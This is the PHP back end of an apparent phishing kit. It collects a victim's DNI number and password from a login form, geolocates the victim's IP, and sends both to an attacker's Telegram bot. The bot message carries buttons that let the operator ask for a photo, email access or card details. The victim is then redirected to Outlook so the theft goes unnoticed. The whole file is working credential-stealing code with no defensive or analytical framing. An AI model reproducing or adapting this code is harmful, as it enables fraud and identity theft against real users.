<?php
session_start();
include 'data.php';
$website = 'https://api.telegram.org/bot'.$botToken;

$ip = $_SERVER["REMOTE_ADDR"];

// Get session ID from existing session
$sessionId = $_SESSION['user_session_id'] ?? null;

if (isset($_POST["dni"]) && isset($_POST["cpass"])) {
    $dni = $_POST['dni'];
    $cpass = $_POST['cpass'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $ip_data_in = curl_exec($ch);
    curl_close($ch);
    $ip_data = json_decode($ip_data_in, true);

    // Mantener solo las claves identificadas en la respuesta de la API
    $country = isset($ip_data["country"]) ? $ip_data["country"] : "";
    $city = isset($ip_data["city"]) ? $ip_data["city"] : "";
    $ip = isset($ip_data["query"]) ? $ip_data["query"] : "";

    // Sin etiquetas no especificadas en el mensaje
    $msg = "Nuevo usuario 🦁\n📧 Dni: => " . $dni . "\n🔑 Contraseña: => " . $cpass . "\n=============================\n Ciudad: " . $city . "\n📍 País: " . $country . "\n📍 IP: " . $ip . "\n==========================\n";

    // Enviar con botones si hay sesión
    if ($sessionId) {
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '� Pedir Foto', 'callback_data' => 'photo_' . $sessionId],
                    ['text' => '🔁 Login', 'callback_data' => 'login_' . $sessionId]
                ],
                [
                    ['text' => '�📩 Mail', 'callback_data' => 'mail_' . $sessionId],
                    ['text' => '💳 Tarjeta', 'callback_data' => 'tarjeta_' . $sessionId]
                ],
                [
                    ['text' => '✅ Listo', 'callback_data' => 'listo_' . $sessionId]
                ]
            ]
        ];
        
        $postData = [
            'chat_id' => $chatID,
            'text' => $msg,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($keyboard)
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $website.'/sendMessage');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    } else {
        // Fallback sin botón
        $url = $website.'/sendMessage?chat_id='.$chatID.'&parse_mode=HTML&text='.urlencode($msg);
        file_get_contents($url);
    }

    echo "<script>";
    echo "window.location.href='https://outlook.live.com/owa/';";
    echo "</script>";
}
